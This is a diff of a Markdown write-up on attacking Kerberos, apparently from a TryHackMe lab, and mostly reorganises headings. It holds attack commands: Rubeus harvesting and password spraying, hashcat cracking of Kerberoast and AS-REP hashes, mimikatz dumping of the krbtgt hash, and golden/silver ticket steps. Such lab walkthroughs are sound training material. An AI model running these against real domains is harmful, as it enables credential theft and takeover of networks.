@@ -1,6 +1,8 @@
 # Attacking kerberos
 
-![Golden ticket](../../_static/images/golden-ticket.png)
+| ![Golden ticket](../../_static/images/golden-ticket.png) |
+|:--:|
+| The example was made from doing the [THM: Attacking Kerberos room](https://tryhackme.com/room/attackingkerberos) |
 
 ## Attack tree
 
@@ -20,17 +22,11 @@
 8 Kerberos backdoors
 ```
 
-## Example
-
-The example was made from doing the [THM: Attacking Kerberos room](https://tryhackme.com/room/attackingkerberos)
-
-### Discovery
-
-#### Scan with nmap
+## Scan with nmap
 
     # nmap -sV -sC -T4 <Machine_IP>
 
-### Enumerate DC users
+## Enumerate DC users
 
 Add the following line to `/etc/hosts` file (as root):
 
@@ -42,9 +38,9 @@ Enumerate users with kerbrute
 
 ![Results kerbrute controller.local](../../_static/images/kerbrute-controllerlocal.png)
 
-### Harvesting & brute-forcing tickets
+## Harvesting & password spraying
 
-#### Harvesting
+### Harvesting
 
 ssh into the machine:
 
@@ -59,12 +55,12 @@ Harvest the tickets:
 
     Rubeus.exe harvest /interval:30
 
-#### Password spraying
+### Password spraying
 
 Before password spraying with Rubeus, add the domain controller domain name to the **windows** host file. 
 Add the IP and domain name to the hosts file from the machine: 
 
-    echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+    echo <MACHINE_IP> CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 
 navigate to the directory Rubeus is in:
 
@@ -76,7 +72,7 @@ Password spraying (with a given password and "spray" it against all found users 
 
 Success! Machine1.
 
-### Kerberoasting
+## Kerberoasting
 
 If the service has a registered SPN then it can be Kerberoastable:
 
@@ -94,7 +90,7 @@ http-roast.txt), and crack with hashcat using the provided Pass.txt.
     hashcat -m 13100 -a 0 http-roast.txt Pass.txt
     hashcat -m 13100 -a 0 sql-roast.txt Pass.txt
 
-### AS-REP Roasting
+## AS-REP Roasting
 
 ssh into the machine:
 
@@ -123,7 +119,7 @@ The hash type of AS-REP Roasting is Kerberos 5 AS-REP etype 23 (mode 18200 for h
     hashcat -m 18200 user3.txt Pass.txt
     hashcat -m 18200 admin2.txt Pass.txt
 
-### Pass the ticket
+## Pass the ticket
 
 ssh into the machine:
 
@@ -166,9 +162,9 @@ Cache and impersonate the ticket:
     
     * File: '[0;1c4707]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
 
-### Golden/silver ticket attacks
+## Golden/silver ticket attacks
 
-#### Dump the sqlservice and Administrator hash
+### Dump the sqlservice and Administrator hash
 
 SQLservice:
 
@@ -201,7 +197,7 @@ User : Administrator
 ...
 ```
 
-#### Dump the krbtgt hash
+### Dump the krbtgt hash
 
 ssh into the machine:
 
@@ -221,7 +217,7 @@ account.
 
     lsadump::lsa /inject /name:krbtgt
 
-#### Create a golden/silver ticket
+### Create a golden/silver ticket
 
 Create a golden ticket to create a silver ticket (put a service NTLM hash into <krbtgt>, the sid of the service 
 account into <sid>, and set the <id> to 1103:
@@ -230,14 +226,14 @@ account into <sid>, and set the <id> to 1103:
 
 The Administrator and sqlservice hashes can be used to create silver tickets.
 
-#### Use the ticket to access other machines
+### Use the ticket to access other machines
 
     mimikatz # misc::cmd
 
 Access machines. It depends on the privileges of the user the ticket was taken from. With a ticket from krbtgt,
 you have access to the ENTIRE network, hence the name golden ticket.
 
-### Kerberos backdoors
+## Kerberos backdoors
 
 ssh into the machine:
 
